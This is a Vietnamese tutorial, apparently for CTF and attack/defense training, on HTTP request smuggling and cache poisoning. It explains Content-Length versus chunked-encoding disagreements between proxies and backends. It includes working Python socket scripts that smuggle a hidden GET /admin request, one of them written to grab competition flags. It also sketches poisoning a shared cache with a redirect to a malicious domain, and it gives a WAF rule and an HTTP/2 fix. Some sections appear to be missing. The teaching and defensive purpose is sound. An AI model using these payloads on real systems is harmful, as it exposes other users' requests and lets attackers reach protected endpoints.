Request Smuggling & Cache Poisoning

Hầu hết web hiện đại có 2 lớp server: 1 proxy/load-balancer/CDN đứng trước, và app server thật đứng sau. Nếu 2 lớp này HIỂU KHÁC NHAU về việc "request này kết thúc ở đâu", bạn có thể nhồi 1 request ẨN vào giữa — request đó sẽ bị gắn nhầm vào request của NGƯỜI DÙNG KHÁC ngay sau bạn, hoặc bị lưu vào cache chung cho mọi người xem.

00 / TÓM TẮT 1 PHÚT

2 kỹ thuật, cùng 1 nguyên nhân gốc

Mọi request HTTP cần 1 cách để server biết "request này DÀI BAO NHIÊU / KẾT THÚC Ở ĐÂU" — có 2 header làm việc này: Content-Length (ghi rõ số byte) và Transfer-Encoding: chunked (đọc tới khi gặp đoạn kết thúc đặc biệt). Nếu request có CẢ HAI header này, và 2 server (proxy + backend) ưu tiên đọc header khác nhau, chúng sẽ hiểu request KẾT THÚC Ở VỊ TRÍ KHÁC NHAU — phần dữ liệu "dư ra" theo cách hiểu của 1 trong 2 server sẽ bị coi là ĐẦU của request tiếp theo. Request Smuggling lợi dụng điều này để chèn request ẩn ảnh hưởng người dùng khác (cùng kết nối). Cache Poisoning lợi dụng tương tự (hoặc qua header bị cache nhầm) để khiến server LƯU 1 response độc vào cache rồi phát lại cho MỌI người xem trang đó.

Nếu chỉ nhớ một điều Đây là lỗ hổng NGUY HIỂM nhưng RỦI RO CAO khi test trên hạ tầng chung (có thể ảnh hưởng người chơi khác hoặc cả hệ thống) — chỉ test kỹ thuật này khi được phép rõ ràng, và trong A/D nên ưu tiên test trên service của CHÍNH ĐỘI MÌNH trước khi áp dụng lên đối thủ.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Content-Length — header ghi CHÍNH XÁC số byte của body. Server đọc đủ số byte đó thì dừng, coi là hết request.
Transfer-Encoding: chunked — cách khác để gửi body không cần biết trước độ dài: chia thành từng "chunk", mỗi chunk bắt đầu bằng 1 dòng ghi ĐỘ DÀI CHUNK (hex), rồi dữ liệu chunk, lặp lại, kết thúc bằng chunk có độ dài 0.
CL.TE / TE.CL — tên gọi 2 kiểu bất đồng: CL.TE = proxy đọc theo Content-Length (front-end), backend đọc theo Transfer-Encoding; TE.CL = ngược lại. Tên luôn viết theo thứ tự "server NGOÀI . server TRONG".

Vì sao 2 lớp đọc khác nhau tồn tại: do các phần mềm proxy/server khác nhà sản xuất, không phải lúc nào cũng tuân thủ 100% theo đúng 1 cách hiểu chuẩn RFC khi gặp request có CẢ HAI header (vốn dĩ request như vậy đã là KHÔNG HỢP LỆ theo chuẩn — mỗi phần mềm "tự quyết" xử lý sao cho hợp lý theo cách riêng).

02 / VÌ SAO LỖ HỔNG TỒN TẠI

2 phần mềm khác nhau, 2 cách hiểu khác nhau về "request kết thúc ở đâu"

Không có lỗi code cụ thể nào ở đây — vấn đề là 2 phần mềm (vd Nginx làm proxy, Apache làm backend) được viết bởi 2 team khác nhau, implement chuẩn HTTP/1.1 theo cách hơi khác nhau cho trường hợp "edge case" hiếm gặp (request có cả 2 header độ dài). Khi ghép 2 phần mềm này lại thành 1 hệ thống, "khoảng hở" giữa 2 cách hiểu chính là nơi bạn giấu request ẩn vào.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

CL.TE: proxy tin Content-Length, backend tin chunked

Kết quả: nếu nạn nhân (hoặc chính bạn ở request kế tiếp trên cùng kết nối giữ nóng - "keep-alive") gửi request ngay sau, backend sẽ GHÉP phần đuôi request ẩn của bạn vào ĐẦU request của họ — có thể khiến request của họ bị hiểu sai hoàn toàn (vd cookie của họ bị gắn vào request /admin của bạn, hoặc response trả lộn cho nhau).

04 / NHẬN DIỆN KHI GẶP CHALLENGE

Dấu hiệu có kiến trúc 2 lớp

  • Header response có Via, X-Cache, X-Served-By, hoặc Server: nginx khác với công nghệ app thực tế (vd thấy cookie Laravel nhưng Server header là nginx) ⟹ có khả năng có 2 lớp.
  • Thời gian phản hồi (response time) khác biệt rõ rệt tuỳ cách gửi header Content-Length/Transfer-Encoding — dấu hiệu "timing-based" phổ biến nhất khi dò (mục 06.C).

(B) Bản gọn chắc — hàm tái dùng, tự tính Content-Length đúng

import socket

def smuggle_request(host, port, smuggled_req, timeout=5):
    body = f"0\r\n\r\n{smuggled_req}"
    req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"{body}"
    )
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    return s.recv(8192).decode(errors="replace")

print(smuggle_request("TARGET", 80, "GET /admin HTTP/1.1\r\nFoo: bar\r\n\r\n"))
Lưu ý quan trọngContent-Length: {len(body)} ở đây PHẢI cố ý ghi SAI (nhỏ hơn độ dài thật của body, chỉ đủ tới hết "0\r\n\r\n") — đây chính là "lỗi cố ý" tạo ra bất đồng. Code mẫu ở trên để minh hoạ cấu trúc, cần tự tính đúng số byte của riêng chuỗi "0\r\n\r\n" (= 5 byte) làm giá trị Content-Length thật, không phải độ dài toàn bộ body.

(C) Bản A/D tái dùng — request ẩn cố định, lặp lại khi cần

import socket, re

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
SMUGGLED = "GET /admin/flag HTTP/1.1\r\nHost: localhost\r\n\r\n"

def exploit_smuggling(host, port=80):
    try:
        req = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\n"
               f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n{SMUGGLED}")
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(req.encode())
        resp = s.recv(8192).decode(errors="replace")
        m = FLAG_RE.search(resp)
        return m.group() if m else None
    except OSError:
        return None

10 / PHÒNG THỦ: VIẾT WAF RULE

1 rule hiệu quả, false positive gần 0

RuleKhớp gì
Chặn request có CẢ Content-Length VÀ Transfer-Encoding cùng lúcTheo RFC 7230, request như vậy BẢN THÂN ĐÃ LÀ không hợp lệ — chặn hoàn toàn an toàn, không ảnh hưởng traffic hợp lệ nào.
Rule hiếm có: an toàn 100%Khác hầu hết lỗ hổng khác trong các bài trước (luôn phải đánh đổi giữa chặn chặt và false positive), rule này gần như không có nhược điểm — vì request hợp lệ theo chuẩn KHÔNG BAO GIỜ cần cả 2 header cùng lúc.

Fix đúng (ở hạ tầng): dùng HTTP/2 end-to-end giữa proxy và backend (HTTP/2 không có kiểu ambiguity này), hoặc đảm bảo proxy/backend cùng 1 phần mềm/cùng cách xử lý edge case.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅Có kiến trúc 2 lớp (proxy/CDN + backend) VÀ 1 trong 2 lớp còn xử lý sai request có cả Content-Length và Transfer-Encoding.
❌App chỉ có 1 lớp server duy nhất (không có reverse proxy/CDN phía trước) — không có "2 cách hiểu" để lợi dụng.
❌Hạ tầng đã chuyển hoàn toàn sang HTTP/2 giữa các lớp — vấn đề ambiguity CL/TE là đặc thù của HTTP/1.1, HTTP/2 dùng cách đóng gói khác (binary framing) không có lỗ hổng này.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng 2 server đơn giản (vd Nginx làm proxy trỏ về 1 Flask app) trên máy, thử gửi payload CL.TE bằng socket thô, quan sát hiệu ứng.

Gợi ý nếu kẹtDùng docker-compose với 2 container (nginx + flask) để dựng nhanh môi trường test, tránh ảnh hưởng hệ thống thật.

⭐⭐ Đổi 1 biến: thử chiều ngược lại TE.CL (mục 06.B) trên cùng môi trường, so sánh hiệu ứng khác CL.TE thế nào.

Gợi ý nếu kẹtChú ý độ dài chunk phải ghi ĐÚNG dạng HEX (vd 5c không phải 92 dù cùng là số 92 thập phân).

⭐⭐⭐⭐ Tự nghĩ: thay vì nhồi request ẩn ảnh hưởng người dùng khác, thiết kế cách dùng cùng kỹ thuật này để làm Cache Poisoning — khiến server LƯU 1 response độc vào cache dùng chung cho MỌI người truy cập trang chủ.

Gợi ý nếu kẹtNhồi request ẩn là 1 request tới CHÍNH trang chủ nhưng có thêm header/path đặc biệt khiến response trả về khác thường (vd redirect tới domain độc) — nếu cache key của CDN không tính đến phần "đặc biệt" đó, mọi người sau sẽ nhận NHẰM response độc đã bị lưu cache.

Thuật ngữ

CL.TE / TE.CLKý hiệu chỉ 2 kiểu bất đồng giữa header Content-Length và Transfer-Encoding ở 2 lớp server.
